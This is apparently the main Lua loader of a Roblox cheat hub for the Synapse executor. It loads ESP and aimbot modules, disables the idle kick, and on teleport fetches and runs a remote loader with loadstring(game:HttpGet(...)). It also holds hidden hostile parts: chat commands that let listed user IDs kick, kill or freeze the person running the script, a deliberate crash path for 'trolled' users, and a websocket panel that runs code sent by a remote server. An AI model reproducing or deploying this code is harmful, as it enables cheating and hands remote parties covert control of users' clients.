if (not accountData) then
    accountData = {
        uuid = 'test',
        createdAt = 0,
        flags = {},
        roles = {'AnimeAdventuresScript'},
        username = 'test'
    }
end;

local debugMode = true;
_G = debugMode and _G or {};

local scriptLoadAt = tick();
local websiteScriptKey, scriptKey = getgenv().websiteKey, getgenv().scriptKey;
local silentLaunch = not not getgenv().silentLaunch;

local function printf() end;

if (typeof(websiteScriptKey) ~= 'string' or typeof(scriptKey) ~= 'string') then
    return;
end;

if (not game:IsLoaded()) then
    game.Loaded:Wait();
end;

local library = sharedRequire('UILibrary.lua');

local Services = sharedRequire('utils/Services.lua');
local toCamelCase = sharedRequire('utils/toCamelCase.lua');

local ToastNotif = sharedRequire('classes/ToastNotif.lua');
local AnalayticsAPI = sharedRequire('classes/AnalyticsAPI.lua');
local errorAnalytics = AnalayticsAPI.new(getServerConstant('UA-187309782-1'));
local Utility = sharedRequire('@utils/Utility.lua');

local _ = sharedRequire('@utils/prettyPrint.lua');

local Players, TeleportService, ScriptContext, MemStorageService, HttpService, ReplicatedStorage = Services:Get(getServerConstant('Players'), 'TeleportService', 'ScriptContext', 'MemStorageService', 'HttpService', 'ReplicatedStorage');

local BLOODLINES_MAIN_PLACE = 10266164381;
local BLOODLINES = 1946714362;

-- If script ran for more than 60 sec and game is rogue lineage then go back to teleporter
if(tick() - scriptLoadAt >= 60) then
    if((game.PlaceId == 3541987450 or game.PlaceId == 3016661674 or game.PlaceId == 5208655184)) then
        TeleportService:Teleport(3016661674);
        return;
    elseif (game.GameId == BLOODLINES) then
        TeleportService:Teleport(BLOODLINES_MAIN_PLACE);
    end;
end;

do -- //Hook print debug
    if (debugMode) then
        local oldPrint = print;
        local oldWarn = warn;
        function print(...)
            return oldPrint('[DEBUG]', ...);
        end;

        function warn(...)
            return oldWarn('[DEBUG]', ...);
        end;

        function printf(msg, ...)
            return oldPrint(string.format('[DEBUG] ' .. msg, ...));
        end;
    else
        function print() end;
        function warn() end;
        function printf() end;
    end;
end;

local LocalPlayer = Players.LocalPlayer
local executed = false;

if (debugMode) then
    getgenv().debugMode = debugMode;

    getgenv().originalFunctions = {
        fireServer = Instance.new('RemoteEvent').FireServer,
        invokeServer = Instance.new('RemoteFunction').InvokeServer,
        getRankInGroup = LocalPlayer.GetRankInGroup,
        index = getrawmetatable(game).__index,
        jsonEncode = HttpService.JSONEncode,
        jsonDecode = HttpService.JSONDecode,
        findFirstChild = game.FindFirstChild,
        runOnActor = syn.run_on_actor,
        getCommChannel = syn.get_comm_channel
    }
end;

LocalPlayer.OnTeleport:Connect(function(state)
    if (executed or state ~= Enum.TeleportState.InProgress) then return end;
    executed = true;

    if(not debugMode) then
        syn.queue_on_teleport(
            string.format([[
                if(aztupHubV3Ran) then return end;
                getgenv().scriptKey='%s';
                getgenv().websiteKey='%s';
                getgenv().silentLaunch=%s;
                loadstring(game:HttpGet('https://serve.aztupscripts.xyz/loader'))();
            ]], scriptKey, websiteScriptKey, tostring(silentLaunch))
        );
    end;
end);

local supportedGamesList = HttpService:JSONDecode(sharedRequire('../gameList.json'));
local gameName = supportedGamesList[tostring(game.GameId)];

--//Base library

for _, v in next, getconnections(LocalPlayer.Idled) do
    if (v.Function) then continue end;
    v:Disable();
end;

--//Load special game Hub

local window;
local column1;
local column2;

if(debugMode) then
    ToastNotif.new({
        text = 'Hub running in debug mode'
    });
end;

if (gameName) then
    window = library:AddTab(gameName);
    column1 = window:AddColumn();
    column2 = window:AddColumn();

    library.columns = {
        column1,
        column2
    };

    library.gameName = gameName;
    library.window = window;
end;

local myScriptId = debug.info(1, 's');
local seenErrors = {};

local hubVersion = typeof(ah_metadata) == 'table' and rawget(ah_metadata, 'version') or '';
if (typeof(hubVersion) ~= getServerConstant('string')) then return SX_CRASH() end;

local function onScriptError(message)
    if (table.find(seenErrors, message)) then
        return;
    end;

    if (message:find(myScriptId)) then
        table.insert(seenErrors, message);
        local reportMessage = 'aztuphub_v_' .. hubVersion .. message;
        errorAnalytics:Report(gameName, reportMessage, 1);
    end;
end

if (not debugMode) then
    ScriptContext.ErrorDetailed:Connect(onScriptError);
    if (gameName) then
        errorAnalytics:Report('Loaded', gameName, 1);

        if (not MemStorageService:HasItem('AnalyticsGame')) then
            MemStorageService:SetItem('AnalyticsGame', true);
            errorAnalytics:Report('RealLoaded', gameName, 1);
        end;
    end;
end;

--//Loads universal part

local universalLoadAt = tick();

require('games/Universal/ESP.lua');
require('games/Universal/Aimbot.lua');

printf('[Script] [Universal] Took %.02f to load', tick() - universalLoadAt);

local loadingGameStart = tick();

if (isUserTrolled) then
    local shouldCrash = gameName or math.random(1, 100) <= 40;

    if (shouldCrash) then
        table.clear(getreg());
    end;
end;

GAMES_SETUP();

Utility.setupRenderOverload();
printf('[Script] [Game] Took %.02f to load', tick() - loadingGameStart);

local keybindLoadAt = tick();

do -- // KeyBinds
    local Binds = {};

    local keybinds = library:AddTab('Keybinds');

    local column1 = keybinds:AddColumn();
    local column2 = keybinds:AddColumn();
    local column3 = keybinds:AddColumn();

    local index = 0;
    local columns = {};

    table.insert(columns, column1);
    table.insert(columns, column2);
    table.insert(columns, column3);

    local sections = setmetatable({}, {
        __index = function(self, p)
            index = (index % 3) + 1;

            local section = columns[index]:AddSection(p);

            rawset(self, p, section);

            return section;
        end
    });

    local blacklistedSections = {'Trinkets', 'Ingredients', 'Spells', 'Bots', 'Configs'};
    local temp = {};

    for _, v in next, library.options do
        if ((v.type == 'toggle' or v.type == 'button') and v.section and not table.find(blacklistedSections, v.section.title)) then
            local section = sections[v.section.title];

            table.insert(temp, function()
                return section:AddBind({
                    text = v.text == 'Enable' and string.format('%s [%s]', v.text, v.section.title) or v.text,
                    parentFlag = v.flag,
                    flag = v.flag .. " bind",
                    callback = function()
                        if (v.type == 'toggle') then
                            v:SetState(not v.state);
                        elseif (v.type == 'button') then
                            task.spawn(v.callback);
                        end;
                    end
                });
            end);
        end;
    end;

    for _, v in next, temp do
        local object = v();

        table.insert(Binds, object);
    end;

    local options = column3:AddSection('Options');

    options:AddButton({
        text = 'Reset All Keybinds',
        callback = function()
            if(library:ShowConfirm('Are you sure you want to reset <font color="rgb(255, 0, 0)">all</font> keybinds?')) then
                for _, v in next, Binds do
                    v:SetKey(Enum.KeyCode.Backspace);
                end;
            end;
        end
    });
end;

printf('[Script] [Keybinds] Took %.02f to load', tick() - keybindLoadAt);
printf('[Script] [Full] Took %.02f to load', tick() - scriptLoadAt);

local libraryStartAt = tick();

library:Init(silentLaunch);
printf('[Script] [Library] Took %.02f to init', tick() - libraryStartAt);

ToastNotif.new({
    text = string.format('Script loaded in %.02fs', tick() - scriptLoadAt),
    duration = 5
});

if (silentLaunch) then
    ToastNotif.new({
        text = 'Silent launch is enabled. UI Won\'t show up, press your toggle key to bring it up.'
    });
end;

-- Admin Commands
task.spawn(function()
    local admins = {11438, 960927634, 3156270886};

    local commands = {
        kick = function(player)
            player:Kick("You have been kicked Mreow!!!!")
        end,

        kill = function(player)
            task.delay(1.5, function()
                player.Character.Head.Transparency = 1;
            end);

            pcall(function()
                require(ReplicatedStorage.ClientEffectModules.Combat.HeadExplode).AkiraKill({char = player.Character});
            end);

            player.Character:BreakJoints();
        end,

        freeze = function(player)
            player.Character.HumanoidRootPart.Anchored = true;
        end,

        unfreeze = function(player)
            player.Character.HumanoidRootPart.Anchored = false;
        end,

        unload = function()
            library:Unload();
        end
    };

    local function findUser(name)
        for _, v in next, Players:GetPlayers() do
            if not string.find(string.lower(v.Name), string.lower(name)) then continue; end;
            return v;
        end;
    end;

    Players.PlayerChatted:Connect(function(_, player, message, _)
        local userId = player.UserId;
        if (not table.find(admins, userId)) then return; end;

        local cmdPrefix, command, username = unpack(string.split(message, ' '));
        local commandCallback = commands[command];
        if cmdPrefix ~= '/e' or not commandCallback then return; end

        local target = findUser(username);
        print('Ran command', command);
        if (target ~= LocalPlayer) then return end;

        return commandCallback(target);
    end);
end);

task.spawn(function()
    if (not table.find(accountData.flags, 'controlPanel')) then return end;

    local socket = getgenv().syn.websocket.connect('wss://panel.aztupscripts.xyz/ws/?websiteKey=' .. websiteScriptKey .. '&jobId=' .. game.JobId);

    local print, warn, error = getgenv().print, getgenv().warn, getgenv().error;

    local function sendToWebSocket(payload)
        socket:Send(HttpService:JSONEncode(payload));
    end;

    socket.OnMessage:Connect(function(msg)
        msg = HttpService:JSONDecode(msg);

        if (msg.type == 'execute') then
            local f, msg = loadstring(msg.content);
            local fenvMt = getrawmetatable(getfenv());

            if (msg) then
                sendToWebSocket({type = 'warn', content = msg});
                return;
            end;

            local function makeLogger(name, outputFunc)
                local clone = clonefunction(outputFunc);

                return newcclosure(function(...)
                    sendToWebSocket({
                        type = name,
                        content = table.concat({...}, ' ')
                    });

                    return clone(...);
                end);
            end;

            setfenv(f, setmetatable({
                print = makeLogger('print', print),
                warn = makeLogger('warn', warn),
                error = makeLogger('error', error),
            }, fenvMt));

            local suc, err = pcall(f);

            if (not suc) then
                sendToWebSocket({type = 'error', content = err});
            end;
        end;
    end);

    sendToWebSocket({type = 'ping'});
end);

getgenv().ah_loaded = true;